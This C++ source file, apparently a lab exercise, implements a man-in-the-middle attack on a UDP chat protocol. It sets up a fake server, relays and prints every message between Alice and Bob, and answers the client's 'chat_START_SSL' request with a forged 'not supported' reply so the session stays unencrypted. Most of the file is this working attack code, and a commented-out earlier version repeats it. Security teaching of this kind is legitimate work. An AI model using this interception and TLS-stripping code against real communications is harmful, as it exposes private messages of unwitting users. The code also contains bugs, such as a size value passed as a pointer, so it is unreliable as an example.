#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/poll.h>

#define MAX 1024
#define PORT 12348
using namespace std;

// Fake Server function for UDP
int create_fake_server_socket() {
    int server_sd;
    struct sockaddr_in addr;
    server_sd = socket(AF_INET, SOCK_DGRAM, 0);
        // Set socket options to allow address reuse
    int opt = 1;
    if (setsockopt(server_sd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1) {
        perror("Setsockopt failed");
        close(server_sd);
        exit(EXIT_FAILURE);
    }
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    if(bind(server_sd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        cout << "\nBind port error" << endl;
        close(server_sd);
        exit(1);
    }
    cout << "......Fake Server initialized......" << endl;
    return server_sd;
}

// Fake Client function for UDP
int create_fake_client_socket(const char *hostname) {
    int client_sd;
    struct sockaddr_in addr;
    if ((client_sd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation error");
        exit(1);
    }
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    return client_sd;
}

    // MITM Attack function for UDP - eavesdropping
int mitm_attack_1(int server_sd, int client_sd,const char *hostname) {
    char receiveMessageAlice[MAX];
    char receiveMessageBob[MAX];
    struct sockaddr_in client_addr, server_addr;
    socklen_t len = sizeof(client_addr);
    struct hostent *host;

    if ((host = gethostbyname(hostname)) == NULL)
    {
        perror(hostname);
        abort();
    }
    bzero(&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = *(long *)(host->h_addr);


    struct pollfd fds[2]; // Two file descriptors for bidirectional communication
    fds[0].fd = client_sd; // Client's socket for receiving
    fds[0].events = POLLIN;
    fds[1].fd = server_sd; 
    fds[1].events = POLLIN;
    
    while(true) {

        if (poll(fds, 2, -1) > 0) {

            if (fds[1].revents & POLLIN) {
                
                int alice_msg = recvfrom(server_sd, receiveMessageAlice, MAX, 0, (struct sockaddr *)&client_addr, &len);
                if(alice_msg < 0) {
                    cout << "Message not received from Client." << endl;
                    return 0;
                }
                cout << "\nReceived message from Client: " << receiveMessageAlice << endl;
                if((strncmp(receiveMessageAlice, "chat_START_SSL", 14)) == 0) {
                    cout << "\nchat_START_SSL_NOT_SUPPORTED message sent to Client." << endl;
                    // Simulate response to "start_tls" with a message
                    sendto(server_sd, "chat_START_SSL_NOT_SUPPORTED", strlen("chat_START_SSL_NOT_SUPPORTED"), 0, (struct sockaddr *)&client_addr, sizeof(client_addr));
                    continue;
                } else if ((strncmp(receiveMessageAlice, "chat_close", 10)) == 0) {
                    cout << "\nConnection terminated from Client. Listening again.." << endl;
                    // Forward "term" message to Bob
                    sendto(client_sd, receiveMessageAlice, strlen(receiveMessageAlice), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
                    memset(&client_addr, 0, sizeof(client_addr));
                    continue;
                } else {
                    // Forward message to Bob
                    cout<<"Forwarding to Bob"<<endl;
                    sendto(client_sd, receiveMessageAlice, strlen(receiveMessageAlice), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
                }
            }

            if (fds[0].revents & POLLIN) {
                int bob_msg = recvfrom(client_sd, receiveMessageBob, MAX, 0, (struct sockaddr *)&server_addr, (socklen_t *)sizeof(server_addr));
                // if(bob_msg < 0) {
                //     cout << "\nMessage not received from Server." << endl;
                //     break;
                // }
                cout << "\nReceived message from Server: " << receiveMessageBob << endl;
                if((strncmp(receiveMessageBob, "chat_close", 10)) == 0) {
                    cout << "\nConnection terminated from Server. Listening again.." << endl;
                    // Forward "term" message to Alice
                    sendto(server_sd, receiveMessageBob, strlen(receiveMessageBob), 0, (struct sockaddr *)&client_addr, len);
                    memset(&client_addr, 0, sizeof(client_addr));
                    continue;
                    break;
                } else {
                    // Forward message to Alice
                    cout<<"Forwarding to Alice"<<endl;
                    sendto(server_sd, receiveMessageBob, strlen(receiveMessageBob), 0, (struct sockaddr *)&client_addr, len);
                }
            }
        }

    }
    close(server_sd);
    close(client_sd);
    return 0;
}

int main(int argc, char *argv[]) {
    char *host_name_client, *port_no, *option;
    char *host_name_server;
    int server_sd;
    int client_sd;

    if (argc != 4) {
        cout << "Number of arguments wrong: " << endl;
        cout << argc << endl;
        exit(1);
    }

    option = argv[1];
    host_name_client = argv[2];
    host_name_server = argv[3];
    // port_no = argv[4];

    server_sd = create_fake_server_socket(); // for fake Bob
    client_sd = create_fake_client_socket(host_name_server); // for fake Alice

    if(strcmp(option, "-d") == 0) {
        mitm_attack_1(server_sd, client_sd,host_name_server);
    } else {
        cout << "Wrong option\n" << endl;
    }

    return 0;
}




// int mitm_attack_1(int server_sd, int client_sd,const char *hostname) {
//     char receiveMessageAlice[MAX];
//     char receiveMessageBob[MAX];
//     struct sockaddr_in client_addr, server_addr;
//     socklen_t len = sizeof(client_addr);
//     struct hostent *host;

//     if ((host = gethostbyname(hostname)) == NULL)
//     {
//         perror(hostname);
//         abort();
//     }
//     bzero(&server_addr, sizeof(server_addr));
//     server_addr.sin_family = AF_INET;
//     server_addr.sin_port = htons(PORT);
//     server_addr.sin_addr.s_addr = *(long *)(host->h_addr);


//     struct pollfd fds[2]; // Two file descriptors for bidirectional communication
//     fds[0].fd = client_sd; // Client's socket for receiving
//     fds[0].events = POLLIN;
//     fds[1].fd = server_sd; 
//     fds[1].events = POLLIN;
    
//     while(true) {
//         int alice_msg = recvfrom(server_sd, receiveMessageAlice, MAX, 0, (struct sockaddr *)&client_addr, &len);
//         if(alice_msg < 0) {
//             cout << "Message not received from Client." << endl;
//             return 0;
//         }
//         cout << "\nReceived message from Client: " << receiveMessageAlice << endl;
//         if((strncmp(receiveMessageAlice, "chat_START_SSL", 14)) == 0) {
//             cout << "\nchat_START_SSL_NOT_SUPPORTED message sent to Client." << endl;
//             // Simulate response to "start_tls" with a message
//             sendto(server_sd, "chat_START_SSL_NOT_SUPPORTED", strlen("chat_START_SSL_NOT_SUPPORTED"), 0, (struct sockaddr *)&client_addr, sizeof(client_addr));
//             continue;
//         } else if ((strncmp(receiveMessageAlice, "chat_close", 10)) == 0) {
//             cout << "\nConnection terminated from Client." << endl;
//             // Forward "term" message to Bob
//             sendto(client_sd, receiveMessageAlice, strlen(receiveMessageAlice), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
//             break;
//         } else {
//             // Forward message to Bob
//             cout<<"Forwarding to Bob"<<endl;
//             sendto(client_sd, receiveMessageAlice, strlen(receiveMessageAlice), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
//         }

//         // Receive message from Bob

        
//         int bob_msg = recvfrom(client_sd, receiveMessageBob, MAX, 0, (struct sockaddr *)&server_addr, (socklen_t *)sizeof(server_addr));
//         // if(bob_msg < 0) {
//         //     cout << "\nMessage not received from Server." << endl;
//         //     break;
//         // }
//         cout << "\nReceived message from Server: " << receiveMessageBob << endl;
//         if((strncmp(receiveMessageBob, "chat_close", 10)) == 0) {
//             cout << "\nConnection terminated from Server." << endl;
//             // Forward "term" message to Alice
//             sendto(server_sd, receiveMessageBob, strlen(receiveMessageBob), 0, (struct sockaddr *)&client_addr, len);
//             break;
//         } else {
//             // Forward message to Alice
//             cout<<"Forwarding to Alice"<<endl;
//             sendto(server_sd, receiveMessageBob, strlen(receiveMessageBob), 0, (struct sockaddr *)&client_addr, len);
//         }
//     }
//     close(server_sd);
//     close(client_sd);
//     return 0;
// }









